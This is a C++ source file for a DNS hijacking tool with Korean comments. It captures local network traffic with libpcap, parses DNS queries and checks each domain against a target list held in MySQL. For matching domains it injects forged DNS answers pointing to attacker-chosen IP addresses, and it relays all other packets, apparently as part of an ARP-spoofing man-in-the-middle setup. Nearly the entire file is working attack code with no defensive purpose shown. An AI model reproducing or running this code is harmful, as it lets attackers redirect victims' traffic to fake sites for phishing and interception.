#include "DNSHijack.hpp"

uint16_t ipid = 0;

static uint16_t udp_cksum(uint16_t *src_addr, uint16_t *dest_addr, uint16_t *buff, size_t len) {
   
    uint32_t sum = 0;
    uint16_t answer = 0;
    
    sum += src_addr[0];
    sum += src_addr[1];
    
    sum += dest_addr[0];
    sum += dest_addr[1];

    sum += htons(0x11);

    sum += htons(len);

    while(len > 1) {
        sum += *buff++;
        len -= 2;
    }

    if (len) {
        sum += * (uint8_t *) buff;
    }

    while (sum>>16)
        sum = (sum & 0xffff) + (sum >> 16);

    answer = ~sum;

    return(answer);
}


static uint16_t ip_cksum (uint16_t *buff, size_t len) {
    
    uint32_t sum = 0;
    uint16_t answer = 0;

    while(len > 1) {
        sum += *buff++;
        len -= 2;
    }

    if (len) {
        sum += * (uint8_t *) buff;
    }

    while (sum>>16)
        sum = (sum & 0xffff) + (sum >> 16);

    answer = ~sum;

    return(answer);
}


void DNSHijack::makeDatagram(uint8_t *datagram, unsigned int len, struct ether_header *ethH, struct ip *ipH, struct udphdr *udpH) {

	int iPoint = 0;
	struct ether_header *etherHeader = (struct ether_header *)((uint8_t *)datagram);

	iPoint = sizeof(ether_header);
	struct ip *ipHeader = (struct ip *)(((uint8_t *)datagram) + iPoint);

	iPoint = iPoint + sizeof(ip);
	struct udphdr *udpHeader = (struct udphdr *)(((uint8_t *)datagram) + iPoint);


    udpHeader->uh_sport = udpH->uh_dport;
    udpHeader->uh_dport = udpH->uh_sport;
    udpHeader->uh_ulen = htons(sizeof(struct udphdr) + len);
    udpHeader->uh_sum = 0;

	// datagram[i] => for calculate UDP Checksum 
	udpHeader->uh_sum = udp_cksum((uint16_t *) &datagram[26], (uint16_t *) &datagram[30], (uint16_t *) &datagram[34], (len + sizeof(struct udphdr)));


	ipHeader->ip_hl = 5;
    ipHeader->ip_v = IPVERSION;	// 4
    ipHeader->ip_id = htons(ipid++);
    ipHeader->ip_tos = 0x0;
    ipHeader->ip_len = htons(sizeof(struct ip) + sizeof(struct udphdr) + len);
    ipHeader->ip_off = 0; 
    ipHeader->ip_ttl = 0x40;	// 64
    ipHeader->ip_p = IPPROTO_UDP;
	ipHeader->ip_sum = 0;
    ipHeader->ip_src.s_addr = ipH->ip_dst.s_addr;
    ipHeader->ip_dst.s_addr = ipH->ip_src.s_addr;

    ipHeader->ip_sum = ip_cksum((unsigned short *) ipHeader, IP_LEN);


	memcpy(etherHeader->ether_shost, relay->my_mac, MAC_LEN);
	memcpy(etherHeader->ether_dhost, ethH->ether_shost, MAC_LEN);
	etherHeader->ether_type = htons(ETHERTYPE_IP);


}

unsigned int DNSHijack::makeDNSAnswer(struct dns_header *dnsHeader, uint8_t *dns_offset, char *extract_domain, uint32_t extract_domain_ip ) {
	
	unsigned int len = 0;

	/* dnsQuery = start of DNS name */
	struct dns_query *dnsQuery;
	dnsQuery = (struct dns_query *)(((uint8_t *)dnsHeader) + sizeof(dns_header));

	/* DNS Header */
	memcpy(&dns_offset[0], &dnsHeader->xid, sizeof(int16_t));		 // xid
	memcpy(&dns_offset[2], "\x81\x80", sizeof(uint16_t));			 // flags 
	memcpy(&dns_offset[4], &dnsHeader->q_count, sizeof(uint16_t));	 // question count
	memcpy(&dns_offset[6], "\x00\x01", sizeof(uint16_t));			 // answer count 
	memcpy(&dns_offset[8], &dnsHeader->auth_count, sizeof(uint16_t));// authority count
	memcpy(&dns_offset[10], &dnsHeader->add_count, sizeof(uint16_t));// additional count
	
	/* DNS Query */
	// +1 is start of "www" size 3 =>  [3]www[5]naver[3]com
	// +1 is end of Domain => www.naver.com'\0'
	len = strlen(extract_domain)+2; 

	memcpy(&dns_offset[12], dnsQuery, len);						// name query 
	len += 12;		 
	memcpy(&dns_offset[len], "\x00\x01", sizeof(uint16_t));		// query type 
	len += 2;
	memcpy(&dns_offset[len], "\x00\x01", sizeof(uint16_t));		// query class 
	len += 2;
	
	
	/* DNS Answer */
	memcpy(&dns_offset[len], "\xc0\x0c", sizeof(uint16_t));			// pointer
	len += 2;
	memcpy(&dns_offset[len], "\x00\x01", sizeof(uint16_t)); 		// type
	len += 2;
	memcpy(&dns_offset[len], "\x00\x01", sizeof(uint16_t));			// class 
	len += 2;
	memcpy(&dns_offset[len], "\x00\x00\x0E\x10", sizeof(uint32_t));	// TTL ( 1minutes )
	len += 4;
	memcpy(&dns_offset[len], "\x00\x04", sizeof(uint16_t));			// rdata length
	len += 2;	
	memcpy(&dns_offset[len], &extract_domain_ip, sizeof(uint32_t));		// IP Addr 
	len += 4;

	
	return len;
}


void DNSHijack::runThread() {

	for(int i=0; i<5; i++) {
		process_pkt.push_back(thread(&DNSHijack::processPacket, this));
	}

//	for(int i=0; i<1; i++) {
//		capture_pkt.push_back(thread(&DNSHijack::packetCapture, this));
//	}

	thread packet_capture{&DNSHijack::packetCapture, this};
//	thread db_update(&MysqlDB::timerSaveDB, ref(mysql_db));
//	thread input_memory(&MysqlDB::inputMemory, ref(mysql_db));
	
//	packet_capture.join();
	packet_capture.detach();
//	db_update.join();
//	db_update.detach();
//	input_memory.join();

	for(auto &t : process_pkt) {
//		t.join();
		t.detach();
	}

//	for(auto &t : capture_pkt) {
////		t.join();
//		t.detach();
//	}
}

void DNSHijack::parseQuery(struct packet_data *n_packet, char *extract_domain, int iPoint) {

	unsigned int index = 0, offset = 1;
	int length = n_packet->packet_size - iPoint;

	uint8_t dns_cur[length];
	memset(dns_cur, 0x00, length);

	for(int i=0; i<length; i++) {
		dns_cur[i] = (unsigned int)n_packet->data[i+iPoint];
	}

	unsigned int size_before_dot = dns_cur[0];

	while(size_before_dot > 0) {
		for(vector<int>::size_type i=0; i<size_before_dot; i++) {
			extract_domain[index++] = dns_cur[i+offset];
		}

		extract_domain[index++] = '.';
		offset += size_before_dot;
		size_before_dot = dns_cur[offset++];
	}
	
	extract_domain[--index] = '\0';

//	printf("!!!!!!!!! Req Domain is : %s\n", extract_domain);

}
	


int DNSHijack::sendDNS(struct packet_data *n_packet, char *extract_domain, uint32_t extract_domain_ip) {

	
	u_char datagram[DGRAM_SIZE];
	uint8_t *dns_offset;
	unsigned int len = 0;

	memset(datagram, 0, DGRAM_SIZE);

	memcpy(datagram, n_packet->data, n_packet->packet_size);

	int iPoint = 0;
	struct ether_header *etherHeader = (struct ether_header *)(((uint8_t *)n_packet->data) + iPoint);
	
	iPoint += sizeof(ether_header);
	struct ip *ipHeader = (struct ip *)(((uint8_t *)n_packet->data) + iPoint);

	iPoint += sizeof(ip);
	struct udphdr *udpHeader = (struct udphdr *)(((uint8_t *)n_packet->data) + iPoint);

	iPoint += sizeof(udphdr);
	struct dns_header *dnsHeader = (struct dns_header *)(((uint8_t *)n_packet->data) + iPoint);

	dns_offset = datagram + sizeof(ether_header) + sizeof(ip) + sizeof(udphdr);
	
	len += makeDNSAnswer(dnsHeader, dns_offset, extract_domain, extract_domain_ip);

	makeDatagram(datagram, len, etherHeader, ipHeader, udpHeader);

	len += (sizeof(struct ether_header) + sizeof(struct ip) + sizeof(struct udphdr));

	int size = 0;
    if ((size = pcap_inject(pcap_handle, datagram, len)) == -1) {
        fprintf(stderr, "Inject Packet Failed:%s\n", pcap_geterr(pcap_handle));
		return -1;
    }

     return 0;
  
}


bool DNSHijack::isUDP(struct ip *ipHeader) {

	if(ipHeader->ip_p == 17) {
		return true;
	}

	return false;
}

bool DNSHijack::isDNS(struct udphdr *udpHeader) {

	uint16_t dst_port = ntohs(udpHeader->uh_dport);

	if(dst_port == 53) {
		return true;
	}
		
	return false;
}


int DNSHijack::startLoop(const char *interface) {
	
	const char *inf = interface;
	char errbuf[PCAP_ERRBUF_SIZE];

	/*
	 * 패킷 캡쳐에 필요한 값 셋팅
	 */
	if((pcap_handle = pcap_open_live(inf, BUFSIZ, 1, 0, errbuf)) == NULL) {
		fprintf(stderr, "ERROR : %s\n", errbuf);
		cout << "Cannot Open Device" << endl;
		return -1;
	}

	/*
	 * Get My Info 
	 */
	relay->getMyMAC(inf);
	relay->getMyIP(inf);
	relay->getRouterMAC();
//	relay->testPrintMyInfo();

	struct bpf_program filter;
	bpf_u_int32 net_mask = 0;

	if(pcap_compile(pcap_handle, &filter, "tcp or udp or icmp", 1, net_mask) == -1) {
		fprintf(stderr, "ERROR: %s\n", pcap_geterr(pcap_handle));
		cout << "Cannot Set Filter" << endl;
		return -1;
	}

	if(pcap_setfilter(pcap_handle, &filter) == -1) {
		fprintf(stderr, "ERROR %s\n", pcap_geterr(pcap_handle));
		return -1;
	}

	/*
	 * Start DB and import data from DB to Memory
	 */
	mysql_db->initDB();
	mysql_db->dbToMemory();


	/*
	 * Start Thread 
	 * 1. packetCapture 
	 * 2. processPacket 
	 */
	runThread();

	cout << "Start Packet Capture" << endl;

	return 0;

}


/* Start by packet capture thread */
void DNSHijack::packetCapture() {
	int res;
	struct pcap_pkthdr *header;
	const u_char *pkt_data;


	/*
	 * pcap_next_ex [packet capture]
	 */
	// XXX : TEST ( 찍어보면서 테스트)
	while(run && (res = pcap_next_ex(pcap_handle, &header, &pkt_data)) >= 0) {
		if (res==0) {
			continue;
		}

		/* Struct Constructor */
		packet_data n_packet;
		n_packet.packet_size = header->caplen;
	
		// Prevent Overflow  	
		if(n_packet.packet_size > PACKET_SIZE) {
			continue;
		}
	
		// pcap_next_ex must make a copy if you want to manipulate it.
		memcpy(n_packet.data, pkt_data, header->caplen);

		// packet to Buffer
		buffer->enQueue(n_packet);

		sleep(0);
	}

	// If it receives SIGNAL 
	pcap_close(pcap_handle);

	cout << "Packet Capture Thread is Stopped" << endl;

}

/* Start by process Packet thread */
void DNSHijack::processPacket() {

//	struct ether_header *etherHeader = NULL;
	struct ip *ipHeader = NULL;
	struct udphdr *udpHeader = NULL;

	char extract_domain[128] = {0,}; 
	
   	packet_data n_packet;

	while(run) {
    	if(buffer->isEmpty()) {
    		usleep(50000);
			continue;
    	}
    
    	/* 
    	 * deQueue 
    	 */
    	if(buffer->deQueue(n_packet)==0) {
			sleep(0);
    		continue;
    	}		


		/*
		 * Verifi the Packet ( Relay ? DNS Hijacking ? )
		 */
		int iPoint = 0;
//		etherHeader = (struct ether_header *)((uint8_t *)n_packet.data);

		iPoint = sizeof(ether_header);
		ipHeader = (struct ip *)(((uint8_t *)n_packet.data) + iPoint);

		iPoint = iPoint + sizeof(ip);
		udpHeader = (struct udphdr *)(((uint8_t *)n_packet.data) + iPoint);


		/* is UDP and is DNS ? */ 
		if(isUDP(ipHeader) && isDNS(udpHeader)) {

			iPoint = iPoint + sizeof(udphdr);
			iPoint = iPoint + sizeof(dns_header);

			parseQuery(&n_packet, extract_domain, iPoint);
			
			uint32_t extract_domain_ip = mysql_db->compareDomain(extract_domain);
			
			/* is the domain exist in memory ? */
			if(extract_domain_ip != 0) {				

				sendDNS(&n_packet, extract_domain, extract_domain_ip);
				cout << "Send DNS Packet" << endl;

			}
			
			else {
				relay->relayPacket(pcap_handle, n_packet);
			}
		}

		else {
			relay->relayPacket(pcap_handle, n_packet);
		}

//		// TODO : 아래 문장 확인 ( 전체 릴레이 ) - 성능 
//			/* if not exist in memory */
//			else {
//				if(relay->isSpoofed(etherHeader, ipHeader)) {
////					cout << "!!!! relay DNS PACKET " << endl;
//					relay->relayPacket(pcap_handle, n_packet);
//				}
//			}
//		}
//
//		/* Relay the Packet */
//		else {
//			if(relay->isSpoofed(etherHeader, ipHeader)) {
//				relay->relayPacket(pcap_handle, n_packet);
//			} 
//			
//			else {
//				sleep(0);
//				continue;
//			}
//		}

		sleep(0);
	}

	cout << "STOP process packet" << endl;

	sleep(0);
}
